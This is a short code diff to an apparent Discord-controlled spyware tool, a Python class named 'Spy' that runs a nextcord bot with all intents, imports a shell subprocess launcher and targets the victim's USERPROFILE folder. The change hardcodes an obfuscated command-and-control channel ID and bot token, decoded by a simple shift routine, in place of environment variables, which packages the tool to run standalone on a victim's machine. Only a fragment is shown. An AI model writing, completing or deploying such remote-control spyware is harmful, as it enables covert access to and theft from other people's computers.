@@ -7,7 +7,7 @@ from asyncio import create_subprocess_shell, subprocess
 
 class Spy:
     Bot = commands.Bot(intents=nextcord.Intents.all(), command_prefix='!')
-    EncryptStep = None
+    EncryptStep = 2
     Channel = None
     ChannelID = None
     Target = os.environ['USERPROFILE']
@@ -20,12 +20,9 @@ class Spy:
 
     @staticmethod
     def Run() -> None:
-        Get = lambda k: os.environ.get(k)
-
-        Spy.EncryptStep = int(Get("ENC"))
-        Spy.ChannelID = int(Spy.Decrypt(Get("CHA")))
+        Spy.ChannelID = int(Spy.Decrypt("34555495546;47969;4"))
         
-        Spy.Bot.run(Spy.Decrypt(Get("TOK")))
+        Spy.Bot.run(Spy.Decrypt("OVK|O|OzQF[zOle7OF[5P|W|PC0IruVOC0yWGFgF3ypwh|dKdX8mo8pH|X6XCRSt/cYaIuJy"))
 
     @staticmethod
     async def Debug(msg) -> None:
